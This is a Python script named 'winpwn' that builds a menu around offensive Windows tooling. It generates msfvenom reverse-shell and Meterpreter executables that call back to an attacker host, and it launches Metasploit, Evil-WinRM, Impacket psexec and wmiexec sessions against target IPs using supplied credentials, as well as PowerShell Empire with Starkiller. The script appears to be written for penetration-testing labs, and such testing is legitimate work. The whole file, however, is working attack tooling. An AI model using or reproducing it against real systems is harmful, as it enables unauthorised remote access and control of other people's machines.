#!/usr/bin/env python3
import os
from sys import exit
from time import sleep
from subprocess import Popen
from termcolor import colored

banner = """
 __    __  ____  ____   ____  __    __  ____       ____  __ __     
|  |__|  ||    ||    \ |    \|  |__|  ||    \     |    \|  |  |    
|  |  |  | |  | |  _  ||  o  )  |  |  ||  _  |    |  o  )  |  |    
|  |  |  | |  | |  |  ||   _/|  |  |  ||  |  |    |   _/|  ~  |    
|  `  '  | |  | |  |  ||  |  |  `  '  ||  |  | __ |  |  |___, |    
 \      /  |  | |  |  ||  |   \      / |  |  ||  ||  |  |     |    
  \_/\_/  |____||__|__||__|    \_/\_/  |__|__||__||__|  |____/     
                                                                   
                                            @rootshooter v1.0                                                               
"""

def clear_screen():
    os.system("/usr/bin/clear")

menu_options = {
    1: 'Generate Reverse Shell (msfvenom)',
    2: 'Launch Metasploit Framework',
    3: 'Launch Evil-WinRM Session',
    4: 'Launch PSExec Session',
    5: 'Launch WMIExec Session',
    6: 'Launch SMBExec Session',
    7: 'Launch Starkiller GUI',
    0: 'Exit',
}

def main_menu():
    print(colored("="*16+" Main Menu "+"="*16+"\n", "cyan", attrs=["bold"]))
    for key in menu_options.keys():
        print(colored(f"{key}. {menu_options[key]}", "cyan", attrs=["bold"]))
    print(colored("\n"+"="*43, "cyan", attrs=["bold"]))

def msf_shell():
    try:
        print(colored("[!] Please enter LHOST [tun0]", "yellow", attrs=["bold"]))
        lhost = input("[winpwn]> ") or "tun0"
        print(colored("[!] Please enter LPORT [53]", "yellow", attrs=["bold"]))
        lport = input("[winpwn]> ") or "53"
        print(colored("[!] Please enter ARCH (x86/x64) [x86]", "yellow", attrs=["bold"]))
        arch = input("[winpwn]> ") or "x86"
        print(colored("[!] Please enter FILENAME [shell.exe]", "yellow", attrs=["bold"]))
        filenm = input("[winpwn]> ") or "shell.exe"
        shell32 = f"/usr/bin/msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o {filenm}"
        shell64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o {filenm}"
        print(colored(f"[+] Generating {filenm}\n", "green", attrs=["bold"]))
        if arch == "x86":
            cmd = Popen([shell32], shell=True)
            cmd.wait()
            clear_screen()
        elif arch == "x64":
            cmd = Popen([shell64], shell=True)
            cmd.wait()
            clear_screen()
        else:
            print(colored("[*] Invalid architecture! Please enter a valid option\n", "red", attrs=["bold"]))
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))
        
def msf_meterp():
    try:
        print(colored("[!] Please enter LHOST [tun0]", "yellow", attrs=["bold"]))
        lhost = input("[winpwn]> ") or "tun0"
        print(colored("[!] Please enter LPORT [53]", "yellow", attrs=["bold"]))
        lport = input("[winpwn]> ") or "53"
        print(colored("[!] Please enter ARCH (x86/x64) [x86]", "yellow", attrs=["bold"]))
        arch = input("[winpwn]> ") or "x86"
        print(colored("[!] Please enter FILENAME [meterpreter.exe]", "yellow", attrs=["bold"]))
        filenm = input("[winpwn]> ") or "meterpreter.exe"
        meterp32 = f"/usr/bin/msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o {filenm}"
        meterp64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o {filenm}"
        print(colored(f"[+] Generating {filenm}\n", "green", attrs=["bold"]))
        if arch == "x86":
            cmd = Popen([meterp32], shell=True)
            cmd.wait()
            clear_screen()
        elif arch == "x64":
            cmd = Popen([meterp64], shell=True)
            cmd.wait()
            clear_screen()
        else:
            print(colored("[*] Invalid architecture! Please enter a valid option\n", "red", attrs=["bold"]))
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))
        
def shellgen():
    try:
        clear_screen()
        print(colored("\n[!] Do you want Shell or Meterpreter? [s/m]", "yellow", attrs=["bold"]))
        choice = input("[winpwn]> ")
        if choice == "s":
            msf_shell()
        elif choice == "m":
            msf_meterp()
        else:
            print("[*] Invalid option!\n")
    except Exception as error:
        print(colored("[*] Invalid architecture! Please enter a valid option\n", "red", attrs=["bold"]))

def msflaunch():
    try:
        msflaunch = "/usr/bin/xfce4-terminal -T 'msfconsole' -x /usr/bin/msfconsole &" 
        cmd = Popen([msflaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))
        
def start_empire():
    try:
        empire = "/usr/bin/sudo /usr/bin/powershell-empire server"
        print(colored("[*] Starting PowerShell Empire Server!", "blue", attrs=["bold"]))
        cmd = Popen([empire], shell=True)
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))

def run_starkiller():
    try:
        starkiller = "/usr/bin/starkiller"
        cmd = Popen([starkiller], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))
        
def starlaunch():
    try:
        start_empire()
        sleep(12)
        run_starkiller()
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))

def winrmlaunch():
    try:
        clear_screen()
        print(colored("[!] Please enter target IP address", "yellow", attrs=["bold"]))
        tgt_ip = input("[winpwn]> ")
        print(colored("[!] Please enter target username", "yellow", attrs=["bold"]))
        user = input("[winpwn]> ")
        print(colored("[!] Please enter target password", "yellow", attrs=["bold"]))
        passwd = input("[winpwn]> ")
        winrmlaunch = f"/usr/local/bin/evil-winrm -i {tgt_ip} -u {user} -p {passwd}"
        cmd = Popen([winrmlaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(colored(f"[*] {error}", "red", attrs=["bold"]))

def psexeclaunch():
    try:
        clear_screen()
        print(colored("[!] Please enter target IP address", "yellow", attrs=["bold"]))
        tgt_ip = input("[winpwn]> ")
        print(colored("[!] Please enter target domain name", "yellow", attrs=["bold"]))
        domain = input("[winpwn]> ")
        print(colored("[!] Please enter target username", "yellow", attrs=["bold"]))
        user = input("[winpwn]> ")
        print(colored("[!] Please enter target password", "yellow", attrs=["bold"]))
        passwd = input("[winpwn]> ")
        psexeclaunch = f"/usr/local/bin/psexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([psexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")

def wexeclaunch():
    try:
        clear_screen()
        print(colored("[!] Please enter target IP address", "yellow", attrs=["bold"]))
        tgt_ip = input("[winpwn]> ")
        print(colored("[!] Please enter target domain name", "yellow", attrs=["bold"]))
        domain = input("[winpwn]> ")
        print(colored("[!] Please enter target username", "yellow", attrs=["bold"]))
        user = input("[winpwn]> ")
        print(colored("[!] Please enter target password", "yellow", attrs=["bold"]))
        passwd = input("[winpwn]> ")
        wexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([wexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")
        
def sexeclaunch():
    try:
        clear_screen()
        print(colored("[!] Please enter target IP address", "yellow", attrs=["bold"]))
        tgt_ip = input("[winpwn]> ")
        print(colored("[!] Please enter target domain name", "yellow", attrs=["bold"]))
        domain = input("[winpwn]> ")
        print(colored("[!] Please enter target username", "yellow", attrs=["bold"]))
        user = input("[winpwn]> ")
        print(colored("[!] Please enter target password", "yellow", attrs=["bold"]))
        passwd = input("[winpwn]> ")
        sexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([sexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")
       
def prog_exit():
    clear_screen()
    exit()

def main():
    print(colored(banner, "white", attrs=["bold"]))
    while True:
        main_menu()
        choice = ""
        try:
            choice = int(input("\n[winpwn]> "))
        except KeyError:
            print("[-] Please choose a valid option!")
        if choice == 1:
            shellgen()
        elif choice == 2:
            msflaunch()
        elif choice == 3:
            winrmlaunch()
        elif choice == 4:
            psexeclaunch()
        elif choice == 5:
            wexeclaunch()
        elif choice == 6:
            sexeclaunch()
        elif choice == 7:
            starlaunch()
        elif choice == 0:
            prog_exit()
        else:
            print("[-] Invalid options! Please make a valid selection.")

if __name__ == "__main__":
    main()
